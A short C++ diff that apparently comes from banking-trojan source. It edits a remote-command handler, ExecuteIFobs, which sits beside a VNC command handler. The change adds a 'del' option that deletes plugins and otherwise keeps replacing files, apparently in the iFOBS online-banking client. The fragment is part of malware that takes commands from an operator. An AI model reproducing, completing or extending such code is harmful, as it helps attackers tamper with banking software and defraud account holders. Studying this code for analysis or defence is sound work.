@@ -1092,7 +1092,11 @@ bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
 bool ExecuteIFobs(void* Manager, PCHAR Command, PCHAR Args)
 {
 #ifdef IFobsH
-	IFobs::CreateFileReplacing(Args);
+	if( StrSame( Args, "del" ) )
+		IFobs::DeletePlugins();
+	else
+		IFobs::CreateFileReplacing(Args);
+
 #endif
 	return TRUE;
 }
